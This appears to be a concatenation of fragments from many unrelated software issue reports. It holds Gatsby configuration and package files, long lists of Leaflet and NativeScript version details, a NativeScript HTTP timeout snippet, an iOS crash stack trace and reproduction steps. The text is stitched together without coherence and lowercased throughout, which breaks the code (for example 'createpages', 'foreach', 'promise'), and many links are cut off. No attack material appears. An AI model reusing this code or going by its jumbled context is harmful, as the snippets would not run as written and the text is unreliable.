sitemetadata.defaultlangkey, uselangkeylayout: true, pagespaths: [ \'/src/pages\' ], markdownremark: { postpage: \'src/templates/blog-post.js\', query: ` { allmarkdownremark { edges { node { fields { slug langkey } } } } }` } } }, { resolve: `gatsby-plugin-google-analytics`, options: { trackingid: `xxx`, }, }, `gatsby-plugin-sitemap`, { resolve: `gatsby-plugin-feed`, feeds: [ { query: ` { allmarkdownremark( sort: { order: desc, fields: [frontmatter___date] } filter: { frontmatter: { draft: { ne: true } } fileabsolutepath: { regex: "/blog/" } } ) { edges { node { excerpt html frontmatter { title date excerpt author { name } } fields { slug } } } } } `, output: `/blog/rss.xml`, setup: ({ query: { site: { sitemetadata } } }) => { return { title: sitemetadata.title, description: sitemetadata.description, feed_url: sitemetadata.siteurl + `/blog/rss.xml`, site_url: sitemetadata.siteurl, generator: `gatsbyjs`, } }, serialize: ({ query: { site, allmarkdownremark } }) => allmarkdownremark.edges.map(({ node }) => { return { title: node.frontmatter.title, description: node.frontmatter.excerpt || node.excerpt, url: site.sitemetadata.siteurl + node.fields.slug, guid: site.sitemetadata.siteurl + node.fields.slug, custom_elements: [{ \'content:encoded\': node.html }], author: node.frontmatter.author.slug, } }), }, ], }, ],
``` </details> `package.json`: <details> ```
{ "name": "imagine-clarity", "description": "imagine clarity", "version": "1.0.0", "author": "s astien dubois <sebastien.dubois@imagineclarity.com>", "dependencies": { "bluebird": "^3.4.6", "gatsby": "^1.9.127", "gatsby-image": "^1.0.5", "gatsby-link": "^1.6.16", "gatsby-plugin-canonical-urls": "^1.0.6", "gatsby-plugin-catch-links": "^1.0.8", "gatsby-plugin-feed": "^1.3.9", "gatsby-plugin-glamor": "^1.6.7", "gatsby-plugin-google-analytics": "^1.0.7", "gatsby-plugin-i18n": "^0.4.0", "gatsby-plugin-intercom-spa": "^0.0.5", "gatsby-plugin-lodash": "^1.0.0", "gatsby-plugin-manifest": "^1.0.7", "gatsby-plugin-nprogress": "^1.0.7", "gatsby-plugin-offline": "^1.0.9", "gatsby-plugin-react-helmet": "^2.0.1", "gatsby-plugin-react-next": "^1.0.0", "gatsby-plugin-sharp": "^1.6.7", "gatsby-plugin-sitemap": "^1.2.5", "gatsby-plugin-twitter": "^1.0.10", "gatsby-plugin-typography": "^1.7.9", "gatsby-remark-autolink-headers": "^1.4.7", "gatsby-remark-copy-linked-files": "^1.5.7", "gatsby-remark-images": "^1.5.11", "gatsby-remark-prismjs": "^1.2.8", "gatsby-remark-responsive-iframe": "^1.4.7", "gatsby-remark-smartypants": "^1.4.7", "gatsby-source-filesystem": "^1.4.12", "gatsby-transformer-csv": "^1.3.5", "gatsby-transformer-documentationjs": "^1.4.6", "gatsby-transformer-remark": "^1.7.7", "gatsby-transformer-sharp": "^1.6.5", "gatsby-transformer-yaml": "^1.5.7", "intl": "^1.2.5", "lodash": "^4.16.6", "mitt": "^1.1.2", "parse-filepath": "^1.0.1", "ptz-i18n": "0.4.0", "react-helmet": "^5.2.0", "react-icons": "^2.2.3", "react-id-swiper": "^1.5.5", "react-intl": "^2.4.0", "react-player": "^1.1.1", "slash": "^1.0.0", "typeface-crimson-text": "^0.0.44", "typography-breakpoint-constants": "^0.15.10", "webfontloader": "^1.6.28" }, "keywords": [ "meditation" ], "license": "mit", "main": "n/a", "private": true, "scripts": { "dev": "gatsby develop -h localhost", "build": "gatsby build", "start": "gatsby serve", "format": "prettier --trailing-comma es5 --no-semi --single-quote --write \'src/**/*.js\'", "test": "echo \\"error: no test specified\\" && exit 1" }
``` </details> `gatsby-node.js`: <details> ```
const promise = require(`bluebird`)
const path = require(`path`)
const slash = require(`slash`) exports.createpages = ({ graphql, boundactioncreators }) => { const { createpage } = boundactioncreators return new promise((resolve, reject) => { const authorpagetemplate = path.resolve(`src/templates/author-page.js`) // query for markdown nodes to use in creating pages
resolve( graphql( ` { # allmarkdownremark( # sort: { order: desc, fields: [frontmatter___date] } # limit: 1000 # ) { # edges { # node { # fields { # slug # } # frontmatter { # title # draft # canonicallink # publishedat # } # } # } # } allauthoryaml { edges { node { slug } } } } ` ).then(result => { // create author pages
result.data && result.data.allauthoryaml.edges.foreach(edge => { createpage({ path: edge.node.slug, component: slash(authorpagetemplate), context: { slug: edge.node.slug, }, }) }) }) ) })
} exports.modifywebpackconfig = ({ config, stage }) => { if (stage === 'build-html') { config.loader('null', { test: /webfontloader/, loader: 'null-loader' }) }
``` </details> `gatsby-browser.js`: not changed `gatsby-ssr.js`: not changed
gatsby version: 1.9.145
node.js version: v8.9.4
operating system: macos 10.13.2
gatsby version: 1.9.52
node.js version: 8.9.1
operating system: mac os 10.11.6
gatsby version: 1.9.130
node.js version: 6.10.2
operating system: mac os high sierra ### file contents (if changed): `gatsby-config.js`:
`package.json`:
`gatsby-node.js`:
`gatsby-browser.js`:
`gatsby-ssr.js`:
- os: macos - version 19.12.2
- python 3.7 docker container, kubernetes v1.16.2 with nginx-ingress 0.26.1 - sanic version 19.9.0
- os: mac os x (but i would expect it to be a problem on most platforms)
- version 0.8.3
- os: ubuntu 18.04 - version:
- os: windows - version 7
- os: macos - version: 0.8.3
- os: centos 7.5 - version 0.7.0
- leaflet version: i believe it is 1.7 (e.g
on osm.org and on leafletjs.com frontpage map) - browser (with version): safari version 13.1.2 (15609.3.5.1.3)
- os/platform (with version): macos 10.15.6
- leaflet version: 1.7.1
- browser (with version): safari 13.1.2 - os/platform (with version): os x 10.13.6 and 10.15.6
- leaflet version: 1.6
- browser (with version): ff68, chrome 79
- os/platform (with version): both linux & windows
- leaflet version: 1.6.0 it would be better if the different classes would not depend on each other that much
i know it has historical reasons, but the whole idea of using es6 import is to not import code one does not use
the library would benefit from a cleaner separation of concerns/dependency injection
in that particular case, couldn't the popup register a move listener on the marker itself and then close itself when this listener is called? are there any es6 enabled specs, i could not find any
when all the specs are based on `window.l` then these kind of bug are hard to find.
- leaflet version: 1.5.1
- browser (with version): safari
- os/platform (with version): ios 10.3.1
- leaflet version: 1.5.1
- browser (with version): safari 12.1.1, chrome 74.0.3729.157
- os/platform (with version): macos 10.13.6
- leaflet version: 1.4
- browser (with version): ie11
- os/platform (with version): windows 10
- leaflet version: 1.4.0
- browser (with version): chrome 71 and firefox 65
- os/platform (with version): win 10
- leaflet version: 1.4.0
- browser (with version): firefox 64.0
- os/platform (with version): ubuntu 18.04
- leaflet version: 1.4.0
- browser (with version): safari 11.0.1
- os/platform (with version): mac os sierra 10.12.6
- leaflet version: 1.3.4 - browser (with version): chrome 70.0.3538.110 (official build) (64-bit)
- os/platform (with version): win 10
- cli: playground - cross-platform modules: - android runtime: not tested - ios runtime: 13.7 - plugin(s): n/a
- cli: 6.7.8 - cross-platform modules: - android runtime: 6.5.3 - ios runtime: 6.5.2 - plugin(s):
- cli: - cross-platform modules: - android runtime: 6.5.1 - ios runtime: 6.5.1 - plugin(s):
- cli: 6.5 - cross-platform modules: `@nativescript/core": "^6.5.1"` - android runtime: 8.0.0 - ios runtime: haven\'t tested - plugin(s): n/a
`tns info`:
getting nativescript components versions information...
component nativescript has 6.5.0 version and is up to date.
component @nativescript/core has 6.5.1 version and is up to date.
component tns-android has 6.5.0 version and is up to date.
component tns-ios is not installed.
- cross-platform modules: 6.5
- cli: 6.4 - cross-platform modules: - android runtime: 6.4.1 - ios runtime: - plugin(s):
- cli: 6.4 - cross-platform modules: - android runtime: 6.4.1 - ios runtime: - plugin(s):
component nativescript has 6.5.0 version and is up to date.
component tns-core-modules has 6.5.1 version and is up to date.
component tns-android has 6.5.0 version and is up to date.
component tns-ios has 6.5.0 version and is up to date.
- cli: 6.5 - cross-platform modules:6.5 - android runtime:6.5 - ios runtime:6.5 - plugin(s):
from play.nativescript.org:
{ "@angular/animations": "8.2.14", "@angular/common": "8.2.14", "@angular/compiler": "8.2.14", "@angular/core": "8.2.14", "@angular/forms": "8.2.14", "@angular/platform-browser": "8.2.14", "@angular/platform-browser-dynamic": "8.2.14", "@angular/router": "8.2.14", "@nativescript/angular": "8.21.0", "@nativescript/core": "6.5.0", "@nativescript/theme": "2.3.3", "@progress-nativechat/nativescript-nativechat": "3.0.0", "kinvey-nativescript-sdk": "4.2.5", "nativescript-accelerometer": "3.0.0", "nativescript-angular": "8.21.0", "nativescript-background-http": "4.2.1", "nativescript-camera": "4.5.0", "nativescript-geolocation": "5.1.0", "nativescript-image": "3.0.1", "nativescript-imagepicker": "7.1.0", "nativescript-intl": "3.0.0", "nativescript-iqkeyboardmanager": "1.5.1", "nativescript-social-share": "1.6.0", "nativescript-theme-core": "1.0.6", "nativescript-ui-autocomplete": "6.0.1", "nativescript-ui-calendar": "6.1.0", "nativescript-ui-chart": "7.1.1", "nativescript-ui-dataform": "6.0.0", "nativescript-ui-gauge": "6.0.0", "nativescript-ui-listview": "8.0.1", "nativescript-ui-sidedrawer": "8.0.0", "nativescript-vue": "2.5.0", "react": "16.13.0", "react-hot-loader": "4.12.20", "react-nativescript": "0.18.0", "reflect-metadata": "0.1.13", "rxjs": "6.5.4", "rxjs-compat": "6.5.4", "svelte": "3.20.1", "svelte-native": "0.8.1", "tns-core-modules": "6.5.0", "zone.js": "0.10.2"
- cli: 6.5.0 - cross-platform modules: 6.5.0 - android runtime: 6.5.0 - ios runtime: 6.5.0
- cli: 6.5.0 - cross-platform modules: 6.5.0 - android runtime: 6.5.0 - ios runtime: 6.5.0 - plugin(s): -
getting nativescript components versions information...
component nativescript has 6.4.1 version and is up to date.
component @nativescript/core has 6.4.2 version and is up to date.
component tns-android has 6.4.1 version and is up to date.
- cli: 6.4.1 - cross-platform modules: 6.4.1 - android runtime: 6.4.1 - ios runtime: 6.4.2 - plugin(s): - **description**
when setting the timeout to 5000, i would expect that the failure callback of the http promise will be called after 5 seconds
it works as expected on ios and android 6, 7, ..
but not on android 4 and android 5
httpmodule.request({ url: " ", timeout: 5000, method: "get", headers: { "content-type": "application/json" } }).then((response) => { alert({title: "alert", message: "received response: " + response.content, okbuttontext: "close"}); }, (e) => { alert({title: "alert", message: "" + e, okbuttontext: "close"}); }
- cli: 6.4.0 - cross-platform modules: 6.4.0 - android runtime: 6.4.0 - ios runtime: 6.4.0
- cli: 6.4.0 - cross-platform modules: 6.4.1 - android runtime: 6.4.1 - ios runtime: 6.4.0 - plugin(s): -
- cli: 6.4.0 - cross-platform modules: 6.4.0 - android runtime: 6.4.1 - ios runtime: 6.4.0 - plugin(s):
- cli: 6.4.0 - cross-platform modules: n/a - ios runtime: 6.4.0 - android runtime (if applicable):6.4.1 - plugin(s):n/a
- cli: 6.4 - cross-platform modules:6.4.0 - android runtime:6.4 - ios runtime:6.4
- cli: 6.4.0 - cross-platform modules:6.4.0 - android runtime:6.4 - ios runtime:6.4
- cli: 6.4.0 - cross-platform modules: 6.4.0 - android runtime:6.4 - ios runtime:6.4
- cli: 6.4.0 - cross-platform modules: 6.4.0 - android runtime: 6.4.0 - ios runtime: 6.4.0
- cli: 6.3.3 - cross-platform modules: 6.3.0 - android runtime: 6.3.1 - ios runtime: 6.3.0 - plugin(s): none
- cli: 6.3 - cross-platform modules: - android runtime: 6.3 - ios runtime: 6.3 - plugin(s):
- cli: latest (6.3.3) - cross-platform modules: latest (6.3.0) and next (^6.3.0-next-2020-01-30-213549-03) - android runtime: 6.3.0 - ios runtime: n/a
- cli: latest (6.3.3) - cross-platform modules: latest (6.3.0) and next (^6.3.0-next-2020-01-30-213549-03) - android runtime: 6.3.0 - ios runtime: n/a
- cli: latest (6.3.3) - cross-platform modules: latest (6.3.0) and next (^6.3.0-next-2020-01-30-213549-03) - android runtime: n/a - ios runtime: 6.3.1
- cli: 6.3.3 - cross-platform modules: 6.1.0 - android runtime: 6.1.2 - plugin(s):
- cli: 6.3.3 - @nativescript/core 6.3.2 - android runtime: - - ios runtime: 6.3.0 - plugin(s): -
- cli: 6.2.0 - ios 13.3
- cli: 6.3.2 - cross-platform modules: 6.3.2 - android runtime: 6.3.1 - ios runtime: 6.3.0 - plugin(s): - nativescript-angular: 8.20.4
- cli: - android runtime: 6.3.0 - ios runtime: 6.3.0 - plugin(s): -
- cli: playground - android runtime: playground - plugin(s): none
- cli: 6.3.2 - cross-platform modules: 6.3.2 - android runtime: 6.3.1 - ios runtime: 6.3.0
"@nativescript/theme": "~2.2.0", "nativescript-ui-dataform": "^6.0.0", "nativescript-ui-listview": "^8.0.1", "tns-core-modules": "~6.3.0"
tns-android 6.3.0
- cli: 6.3.0 - cross-platform modules: 6.3.0 - ios runtime: 6.3.0
- cli: 6.2.2 - cross-platform modules: 6.2.3 - android runtime: android 6.0.1 - ios runtime: - plugin(s):
- cli: 6.3.0 - cross-platform modules: 6.3.0 - android runtime: 6.3.0 - ios runtime: - - plugin(s): -
- cli: 6.2.1 - cross-platform modules: 6.2.1 - android runtime: 6.2.0 - ios runtime: na - plugin(s): na
- cli: 6.2.2 - cross-platform modules: 6.2.3 - android runtime: 6.2 - ios runtime: 6.2 - plugin(s): none
- cli: 6.2.0 - cross-platform modules: 6.2.3 - android runtime: 6.2.0
@nativescript/core 6.2.1
nativescript-vue 2.4.0
tns-android 6.2.0
nativescript-material-core 3.0.1
- cli: 6.1.2
- cli: 6.1.2 - cross-platform modules: 6.2.1 - android runtime: 6.2.0 - ios runtime: 6.2.0 - plugin(s): -
nativescript-angular - cli: 6.1.2 - cross-platform modules: 6.2.1 - android runtime: 6.1.2 - ios runtime: 6.2.0 - plugin(s): radsidedrawer
- cli: 6.2.0 - cross-platform modules: 6.2.1 - ios runtime: 6.3 @ next (version doesn't seem to actually matter)
- cli: 6.2 - cross-platform modules: 6.2 - android runtime: 6.2 - ios runtime: - plugin(s):
- cli: 6.2.0 - android runtime: 6.2.0 - ios runtime: 6.2.0 - nativescript-angular: 8.0.2 - angular: 8.0.0
- ios operating system: 13.2.2
- cli: 6.1.2 - cross-platform modules: 6.1.1 - android runtime: 6.1.2 **target platform**
- device 1: android: 6.0.1 , display: 720 x 1280
- device 2: android: 4.2.2 , display: 1920 x 1200
- device 3: android: 6.0.1 , display: 800 x 1280
- 6.1.0 running on both platforms but focusing on ios - angular 8.2.0
- tns-ios: 6.1.0
- tns-android 6.1.2
- cli: 6.2 - cross-platform modules:6.2 - android runtime:6.2 - ios runtime:6.2
- cli: 6.1.2 - android runtime: 6.1.2 - ios runtime: 6.1.0 - nativescript-theme-core: 2.0.24 - using nativescript iwth angular
- android: api level 28 - plugin(s): nativescript 6.1.2
tns-core-modules: 6.2.0-rc-2019-10-25-193201-01
- cli: 6.1.2 - android runtime: 6.1.1 - ios runtime: 6.1.1
- cli: 6.1.2 - cross-platform modules: 6.1.x (whatever playground is running) - android runtime: 6.1.2 - ios runtime: - plugin(s):
- cli: 6.0.0 - cross-platform modules: 6.0.1 - android runtime: 6.0.0 - ios runtime: 6.0.0 - plugin(s):
- cli: n/a - cross-platform modules: 6.1.0 - android runtime: n/a - ios runtime: n/a - plugin(s): n/a
- cli: 6.1.2 - cross-platform modules: 6.1.1 - android runtime: 6.1.2 - ios runtime: - plugin(s): ``` "dependencies": { "@angular/animations": "~8.2.0", "@angular/common": "~8.2.0", "@angular/compiler": "~8.2.0", "@angular/core": "~8.2.0", "@angular/forms": "~8.2.0", "@angular/platform-browser": "~8.2.0", "@angular/platform-browser-dynamic": "~8.2.0", "@angular/router": "~8.2.0", "nativescript-advanced-permissions": "^1.2.0", "nativescript-mapbox": "file:../publish/dist/package", "nativescript-angular": "~8.2.0", "nativescript-theme-core": "~1.0.6", "nativescript-ui-sidedrawer": "~7.0.0", "reflect-metadata": "~0.1.12", "rxjs": "^6.4.0", "rxjs-compat": "^6.5.3", "tns-core-modules": "~6.1.0", "zone.js": "~0.9.1" }, "devdependencies": { "@angular/compiler-cli": "~8.2.0", "@ngtools/webpack": "~8.2.0", "@types/chai": "~4.1.7", "@types/mocha": "~5.2.5", "@types/node": "~10.12.18", "chai": "~4.1.2", "codelyzer": "~4.5.0", "mocha": "~5.2.0", "mocha-junit-reporter": "~1.18.0", "mocha-multi": "~1.0.1", "mochawesome": "~3.1.2", "nativescript-dev-appium": "^6.1.2", "nativescript-dev-webpack": "~1.2.0", "node-sass": "^4.7.1", "tslint": "~5.19.0", "typescript": "~3.5.3" }
using android emulator with an api 28 image under ubuntu 18.04 lts with android studio:
android studio 3.5
build #ai-191.8026.42.35.5791312, built on august 8, 2019
jre: 1.8.0_202-release-1483-b49-5587405 amd64
jvm: openjdk 64-bit server vm by jetbrains s.r.o
linux 4.15.0-38-generic
- cli: 6.1.2 - cross-platform modules: 6.1.1 - android runtime: 6.1.2 - ios runtime: 6.1.0 - plugin(s): -
- cli: latest - cross-platform modules: 6.1.1 - android runtime: n/a - ios runtime: 6.1.0
- cli: 6.1.1 - cross-platform modules: - android runtime: - ios runtime: - plugin(s):
- cli: 6.1.2 - cross-platform modules: 6.1.2 - android runtime: 6.1.0 - ios runtime: - - plugin(s): -
- cli: 6.1.2 - cross-platform modules: 6.1.1 - android runtime: 6.1.0 - ios runtime: - - plugin(s): -
- cli: 6.1.2 - cross-platform modules: 6.1.1 - android runtime: 6.1.x - plugin(s): nativescript-advaced-webview@4.0.1
both _ios_ and _android_ (playground).
- cli: 6.1 - cross-platform modules: 6.1 - android runtime: 6.1 - ios runtime: 6.1 - plugin(s):
- cli: 6.1 - cross-platform modules: 6.1.1 - android runtime: 6.1.1 - ios runtime: 6.1.0 - plugin(s):
``` "nativescript-advanced-webview": "^3.0.2", "nativescript-angular": "^8.2.1", "nativescript-canvas": "^2.1.5", "nativescript-datetimepicker": "^1.2.1", "nativescript-drop-down": "^5.0.0", "nativescript-feedback": "^1.3.9", "nativescript-http-formdata": "^1.7.0", "nativescript-imagecropper": "^1.0.5", "nativescript-intl": "^3.0.0", "nativescript-iqkeyboardmanager": "^1.5.1", "nativescript-localize": "^4.1.1", "nativescript-mediafilepicker": "^2.0.16", "nativescript-pager": "^11.0.9", "nativescript-permissions": "^1.3.7", "nativescript-phone": "^1.4.0", "nativescript-platform-css": "^1.6.9", "nativescript-plugin-firebase": "^9.0.4", "nativescript-sqlite": "^2.3.3", "nativescript-theme-core": "~1.0.4", "nativescript-ui-listview": "^7.0.5", "nativescript-ui-sidedrawer": "7.0.0",
- cli: 6.1.2 - cross-platform modules: latest (6.1.1) - android runtime: latest (6.1.1)
- cli: 6.1.2 - cross-platform modules: 6.1.1 - android runtime: 6.1.0 - ios runtime: 6.1.1 - plugin(s): -
- cli: 6.1.2 - cross-platform modules: 6.1.1 - ios runtime: 6.1.1 - plugin(s): nativescript-theme-core
- cli: 6.1.1 - cross-platform modules: 6.1.1 - ios runtime: 6.1.0
- cli: 6.1.0 - cross-platform modules: 6.1.0 - ios runtime: 6.1.0
- cross-platform modules: 6.1.0
- cli: 6.1.0 - cross-platform modules: 6.1.0 - ios runtime: 6.1.0
- cli: 6.1.0 - cross-platform modules: 6.1.0 - ios runtime: 6.1.0
tns-ios version: 6.0.1
angular: 8.1.0
platform: ios ios blue bar location disturbs the whole app layout
that's adding the white space just before the action bar
without the blue bar location layout works as expected.
center image also disturb on the launch screen
- cross-platform modules: 6.1.0
- cli: 6.1 - cross-platform modules: 6.1 - android runtime: 6.1 - ios runtime: - - plugin(s): -
- android runtime: 6.1.0
- cli: 6.1.0 - cross-platform modules: 6.1.0 - android runtime: - ios runtime: - plugin(s):
- cli: 6.1.0 - cross-platform modules: 6.1.0 - android runtime: - ios runtime: 6.1.0 - plugin(s): nativescript-angular 8.2.0 - device: - ios: v12.4 - iphone se
- cli: - cross-platform modules: 6.0.7 - android runtime: 6.0.2 - ios runtime: 6.0.2 - plugin(s): -
- cli: 6.0.1 - cross-platform modules: 6.0.7 - ios runtime: 6.0.2
- cli: 6.0.3 - cross-platform modules: 6.0.6-next - android runtime: 6.0.1
- cross-platform modules: 6.1.0-next-2019-08-21-142040-01
- cli: 6.0.3 - cross-platform modules: 6.0.0 - android runtime: 6.0.0 - ios runtime: 6.0.0 - plugin(s):
- tns-core-modules: 6.0.6
- cli: 6.0.3 - cross-platform modules: 6.1.0-next-2019-08-18-231654-03 - ios runtime: 6.1.0-2019-08-15-135151-01 the problem is related to incorrect handling of a scenario where tabstrip and tabstripitems are created dynamically in code behind
the issue is reproducible only on ios
console info hmr: hot module replacement enabled
waiting for signal.
console log >>> loaded [content 1]
console log >>> loaded [content 2]
console log >>> loaded [content 3]
console log tabs.nativeview: <_uipageviewcontrollercontentview: ; frame = (0 0; 375 812); clipstobounds = yes; opaque = no; autoresize = w+h; layer = <calayer: >>
***** fatal javascript exception - application has been terminated
native stack trace:
1 nativescript::reportfatalerrorbeforeshutdown(jsc::execstate*, jsc::exception*, bool)
2 nativescript::fficallback<nativescript::objcmethodcallback>::fficlosurecallback(ffi_cif*, void*, void**, void*)
3 ffi_closure_unix64_inner
4 ffi_closure_unix64
5 -[calayer layoutsublayers]
6 ca::layer::layout_if_needed(ca::transaction*)
7 ca::layer::layout_and_display_if_needed(ca::transaction*)
8 ca::context::commit_transaction(ca::transaction*)
9 ca::transaction::commit()
10 _aftercacommithandler
11 __cfrunloop_is_calling_out_to_an_observer_callback_function__
12 __cfrunloopdoobservers
13 __cfrunlooprun
14 cfrunlooprunspecific
15 gseventrunmodal
16 uiapplicationmain
17 ffi_call_unix64
javascript stack trace:
viewdidlayoutsubviews(
at uiapplicationmain([native code])
at _start(
at run(
at
at ./app.ts(
at __webpack_require__(
at checkdeferredmodules(
at webpackjsonpcallback(
at anonymous(
at evaluate([native code])
at moduleevaluation([native code])
at promisereactionjob([native code])
javascript error:
js error typeerror: undefined is not an object (evaluating 'this.tabbar.frame')
nativescript caught signal 11.
native stack:
1 sig_handler(int)
2 _sigtramp
4 libunwind::unwindcursor<libunwind::localaddressspace, libunwind::registers_x86_64>::step()
5 _unwind_raiseexception
6 __cxa_throw
7 _objc_exception_destructor(void*)
8 nativescript::reportfatalerrorbeforeshutdown(jsc::execstate*, jsc::exception*, bool)
9 nativescript::fficallback<nativescript::objcmethodcallback>::fficlosurecallback(ffi_cif*, void*, void**, void*)
10 ffi_closure_unix64_inner
11 ffi_closure_unix64
12 -[calayer layoutsublayers]
13 ca::layer::layout_if_needed(ca::transaction*)
14 ca::layer::layout_and_display_if_needed(ca::transaction*)
15 ca::context::commit_transaction(ca::transaction*)
16 ca::transaction::commit()
17 _aftercacommithandler
18 __cfrunloop_is_calling_out_to_an_observer_callback_function__
19 __cfrunloopdoobservers
20 __cfrunlooprun
21 cfrunlooprunspecific
22 gseventrunmodal
23 uiapplicationmain
24 ffi_call_unix64
uiapplicationmain([native code])
at _start(
at run(
at
at ./app.ts(
at __webpack_require__(
at checkdeferredmodules(
at webpackjsonpcallback(
at anonymous(
at evaluate([native code])
at moduleevaluation
at promisereactionjob ```
the problem can be reproduced with [nativescript-sdk-examples-js]( app with [properties example](
might be related to [pr#7580](
- cli: 6.0.3 - cross-platform modules:6.0.6 - android runtime: 6.0.0 - ios runtime: (n/a) 6.0.2 - plugin(s): using nativescript-vue, but seems like the problem isn't related to that.
- cli: 6.0.3 - cross-platform modules: 6.0.6 - android runtime: 6.0.1 - ios runtime: 6.0.2
- cli: 6.0.0 - cross-platform modules: 6.0.0 - android runtime: 6.0.0 - ios runtime: 6.0.0 - plugin(s):
- cli: 6.0.2 - ios runtime: 6.0.1
- cli: 6.0.0 - cross-platform modules: 6.0.2 - android runtime: 6.0.0 - ios runtime: 6.0.0 - plugin(s):
- cli: 6.0.1 - cross-platform modules: 6.0.1 - android runtime: 6.0.0 - ios runtime: 6.0.0 - plugin(s): none
- cli: 6.0.1 - cross-platform modules: 6.0.1 - android runtime: 6.0.0 - ios runtime: 6.0.1
- cli: 6.0.1 - cross-platform modules: angular 8.1.2 - android runtime: latest - ios runtime: latest
- cli: rc - cross-platform modules: rc - ios runtime: rc
- cli: 6.0.0 - cross-platform modules:6.0.1 - android runtime:6.0.0
- cli: 6.0.0 - cross-platform modules: 6.0.1 - android runtime: 6.0.0 - ios runtime: 6.0.0
- cli: 6.0.0 - cross-platform modules: 6.0.1 - android runtime: 6.0.0 - ios runtime: 6.0.0
- cross-platform modules: `^6.0.0-rc-2019-07-10-140734-02` - android runtime: - ios runtime: - plugin(s):
- cli: rc - cross-platform modules: rc - android runtime: rc - ios runtime: rc
- cli: rc - cross-platform modules: rc - android runtime: rc
- cli: rc - cross-platform modules: rc - android runtime: rc
- cli: rc - cross-platform modules: rc - android runtime: rc
- cli: rc - cross-platform modules: rc - android runtime: rc - ios runtime: rc
- cli: 5.4.2 - cross-platform modules:5.4.3 - android runtime:5.4.0
create project `tns create project --ng`
start debugging with hmr `tns debug android --hmr`
change `<actionbar title=` and save
actual: the new title won't be updated in elements tab in chromedevtools also from now on you won't able to change it from the elements tab.
expected: the new title to be shown in elements tab in chromedevtools also to be able to change it from elements tab in chromedevtools tab-a
from @darind modules are calling some endpoint in runtime which is updating the value
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
- tns-core-modules modules: 6.0.0-rc-2019-07-03-223248-02
- cli: 5.4.2 - cross-platform modules: 5.4.3 - android runtime: 5.4.0 - ios runtime: couldn't test this on ios - plugin(s): na
- tns-core-modules modules: 6.0.0-rc-2019-06-28-175837-02
- tns-core-modules modules: 6.0.0-rc-2019-06-28-175837-02
- nativescript playground
- cli: next - cross-platform modules: next - android runtime: next - ios runtime: next
- cli: 5.4.2 - cross-platform modules: 5.4.2 - android runtime: 5.4.2 - ios runtime: 5.4.2
occurs both on android and ios
replicable in the playground.
5.4.2, probably all previous versions.
- cli: 5.4 - cross-platform modules: 5.4 - android runtime: 5.4 - ios runtime: 5.4
- cli: `5.4.0` - cross-platform modules: `5.4.2` - android runtime: not needed (im testing on ios) - ios runtime: `5.4.1`
- cli: 5.4.0 - cross-platform modules: 5.4.0 - android runtime: 5.4.0 - ios runtime: 5.4.0
- cli: 5.4.0 - cross-platform modules:5.4.0 - android runtime:5.4.0 - ios runtime:5.4.0
- cli: 5.4.0 - cross-platform modules: 5.4.2 - android runtime: 5.4.0 - ios runtime: 5.4.1 - plugin(s):
- cli: 5.4.0 - cross-platform modules: 5.4.0
- cli: 5.4.0 - cross-platform modules: 5.4.0
- cli: 5.4.0 - cross-platform modules: 5.4.0
- cli: 5.4.0 - cross-platform modules: 5.4.0 - android runtime: 5.4.0 - ios runtime: 5.4.0
- cli: 5.4.0 - cross-platform modules: 5.4.1 - android runtime: 5.4.0 - ios runtime:5.4.0
- cli: 5.4.0 - cross-platform modules: 5.4.2 - ios runtime: 5.4.0
- cli: 5.4.0 - cross-platform modules: 5.4.0 - android runtime: 5.4.0 - ios runtime: 5.4.0 - plugin(s):
- cli: 5.4.0 - cross-platform modules: 5.4.0 - android runtime: 5.4.0 - ios runtime: 5.4.0
- cli: 5.4.0 - cross-platform modules: 5.4.0 - android runtime: 5.4.0
- cli: 5.3.4 - cross-platform modules: 5.3.2 - android runtime: 5.3.1 - ios runtime: 5.3.1
- cli: 5.3.4 - cross-platform modules: 5.3.0 - android runtime: - ios runtime: 5.3.1 - plugin(s):
- cli: 5.3.4 - cross-platform modules: 5.3.2 - android runtime: 5.3.1 - ios runtime: 5.3.1
- cli: 5.3.1 - cross-platform modules: 5.3.2 - android runtime: not applicable - ios runtime: 5.3.1 - plugin(s): nativescript-angular@7.2.3
- cli: 5.3.0 - android runtime: 5.3.1 - ios runtime: 5.3.1
- cli: 5.2.3 - latest nativescript preview app
- cli: 5.3 - cross-platform modules: 5.3 - android runtime: 5.3 - ios runtime: 5.3 - plugin(s):
- cli: 5.2 - cross-platform modules: 5.2.2 - android runtime: 5.2.0 - ios runtime: 5.2.1
- cli: 5.2.3 - cross-platform modules: 5.2.2 - android runtime: 5.2.1 - ios runtime: - - plugin(s): -
- cli: 5.2.0 - cross-platform modules: 5.2.2 - android runtime: 5.2.1 - ios runtime: 5.2.0
- cli: 5.2.2 - cross-platform modules: 5.2.2 - android runtime: 5.2.1 - ios runtime: 5.2.0 - plugin(s): n/a
- cli: 5.2 - cross-platform modules: 5.2 - ios runtime: 5.2
- cli: 5.2.0 - cross-platform modules: 5.2.1 - android runtime: 5.2.0 - ios runtime: 5.2.0
- cli: 5.0.2 - cross-platform modules: 5.1.2 - android runtime: 5.1.0 - ios runtime: 5.1.0 - plugin(s): none
- cli: 5.2.0 - cross-platform modules: 5.2.0 - android runtime: 5.2.0 - ios runtime: 5.2.0 - plugin(s): none
- android runtime: 5.0.0 - ios runtime: 5.0.0 <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
- cli: 5.1 - cross-platform modules: 5.1 - android runtime: 5.1 - ios runtime: 5.1 - plugin(s): 5.1
- cli: 5.1.1 - cross-platform modules: 5.1.1 - android runtime: 5.1.0 - ios runtime: 5.1.1
- cli: 5.1.1 - cross-platform modules: 5.1.2 - android runtime: 5.1.0 - ios runtime: 5.1.0
- cli: 5.1.1 - cross-platform modules: 5.1.0 - android runtime: 5.1.0 - ios runtime: 5.1.0 - plugin(s): nativescript-ui-listview: 5.0.1
- cli: 5.1.0 - cross-platform modules: none - android runtime: not a problem on android - ios runtime: 5.1.0 - plugin(s): n/a
-nativescript version is 5.1.0 -tns-core-module is 5.1.2 - tns-android is 5.1.0 - tns-ios 5.1.0 <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
latest 5.1 - issue on ios platform plugin nativescript-ui-sidedrawer
- cli: 5.1.0 - cross-platform modules: 5.1.1 - ios runtime: 5.1.0
- cli: 5.1.0 - cross-platform modules: 5.1.1 - android runtime: 5.1.0 - ios runtime: 5.1.0 - plugin(s): n/a
